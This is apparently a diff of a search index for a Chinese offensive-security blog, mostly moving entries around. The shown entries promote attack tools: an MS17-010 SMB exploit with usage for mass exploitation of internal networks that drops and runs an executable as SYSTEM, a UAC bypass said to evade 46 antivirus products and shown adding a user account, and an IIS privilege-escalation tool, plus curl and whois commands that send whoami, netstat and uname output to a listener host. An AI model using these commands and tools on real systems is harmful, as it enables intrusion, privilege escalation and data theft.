@@ -1326,10 +1326,9 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
 
 <h4 id="Base64回显-1"><a href="#Base64回显-1" class="headerlink" title="Base64回显"></a>Base64回显</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://192.168.250.21:800/deb64/`whoami|base64`</span><br></pre></td></tr></table></figure>
 
-<p>合并成一行，但是Ladon 8.2前的回显第行多一个-（而-符号是必须的），导致无法解密</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://192.168.250.21:800/deb64/`netstat -an|base64|tr <span class="string">'\n'</span> <span class="string">'-'</span>`</span><br></pre></td></tr></table></figure>
 
-<p>所以回显的一整行，需先替换-符号后才能解密，Ladon 8.3已支持</p>
+<p>PS：Base64回显会多出-符号，导致8.2无法解密，Ladon 8.3已完美兼容</p>
 <h3 id="Whois回显"><a href="#Whois回显" class="headerlink" title="Whois回显"></a>Whois回显</h3><p>Ladon 8.3的Web或Gui版的NC均可回显，无论是否BASE64加密，Ladon均可完美支持</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># whois -h 192.168.250.27 -p 800 `uname -a|base64`</span></span><br><span class="line">Timeout.</span><br><span class="line"></span><br><span class="line">root@kali:~/Desktop<span class="comment"># whois -h 192.168.250.27 -p 800 `uname -a`</span></span><br><span class="line">Timeout.</span><br></pre></td></tr></table></figure>
 
@@ -3412,11 +3411,11 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <categories>
         <category>Ladon</category>
         <category>.NET</category>
-        <category>源码</category>
         <category>主机发现</category>
+        <category>源码</category>
         <category>内网渗透</category>
-        <category>编程</category>
         <category>信息收集</category>
+        <category>编程</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -5514,6 +5513,33 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
       </tags>
   </entry>
   <entry>
+    <title>SMB溢出工具加强版</title>
+    <url>/p/68a8bf1b.html</url>
+    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
+<p><strong>编译:</strong>python</p>
+<p><strong>漏洞:</strong>MS17-010</p>
+<p><strong>用法:</strong></p>
+<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
+<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
+<p><strong>内网批量</strong></p>
+<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
+<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
+<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
+<p>&nbsp;</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>MS17010</tag>
+        <tag>SMB</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2019-0604 SharePoint GetShell Exploit</title>
     <url>/p/e896a7d1.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>漏洞信息</strong></span></p>
@@ -5610,56 +5636,6 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>GetShell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SMB溢出工具加强版</title>
-    <url>/p/68a8bf1b.html</url>
-    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
-<p><strong>编译:</strong>python</p>
-<p><strong>漏洞:</strong>MS17-010</p>
-<p><strong>用法:</strong></p>
-<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
-<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
-<p><strong>内网批量</strong></p>
-<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
-<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
-<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
-<p>&nbsp;</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>提权</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>MS17010</tag>
-        <tag>SMB</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
-    <url>/p/41e1c61c.html</url>
-    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
-<p>工具: k8uac<br>编译: VC++</p>
-<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
-<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
-<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
-<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
-<p>示例如下:</p>
-<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
-<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>BypassUAC</tag>
       </tags>
   </entry>
   <entry>
@@ -5821,6 +5797,29 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
       </tags>
   </entry>
   <entry>
+    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
+    <url>/p/41e1c61c.html</url>
+    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
+<p>工具: k8uac<br>编译: VC++</p>
+<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
+<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
+<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
+<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
+<p>示例如下:</p>
+<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
+<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>BypassUAC</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>mimikatz 2.1.1一键版 &amp; PowerShell</title>
     <url>/p/77429fa6.html</url>
     <content><![CDATA[<p>无需任何参数,运行EXE即可自动读取Windows系统密码</p>
@@ -5893,33 +5892,6 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
       </tags>
   </entry>
   <entry>
-    <title>全版本IIS提权工具iislpe</title>
-    <url>/p/6b9b3afe.html</url>
-    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
-<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
-<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
-<p><strong>原理:</strong></p>
-<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
-<p><strong>用法:</strong></p>
-<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
-<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
-<p>&nbsp;</p>
-<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
-<p>&nbsp; &nbsp;&nbsp; </p>
-<p>&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>LPE</tag>
-        <tag>IIS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>基于Browser协议探测内网主机</title>
     <url>/p/16b5ff0b.html</url>
     <content><![CDATA[<p>利用Browser协议可获取机器IP、MAC、机器名、操作系统、域，如图</p>
@@ -5982,18 +5954,45 @@ from pprint import pprint
 <p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
       <categories>
         <category>工具</category>
-        <category>源码</category>
         <category>主机发现</category>
+        <category>源码</category>
         <category>嗅探</category>
         <category>内网渗透</category>
-        <category>编程</category>
         <category>信息收集</category>
+        <category>编程</category>
         <category>Python</category>
       </categories>
       <tags>
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>全版本IIS提权工具iislpe</title>
+    <url>/p/6b9b3afe.html</url>
+    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
+<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
+<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
+<p><strong>原理:</strong></p>
+<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
+<p><strong>用法:</strong></p>
+<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
+<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
+<p>&nbsp;</p>
+<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
+<p>&nbsp; &nbsp;&nbsp; </p>
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>LPE</tag>
+        <tag>IIS</tag>
       </tags>
   </entry>
 </search>
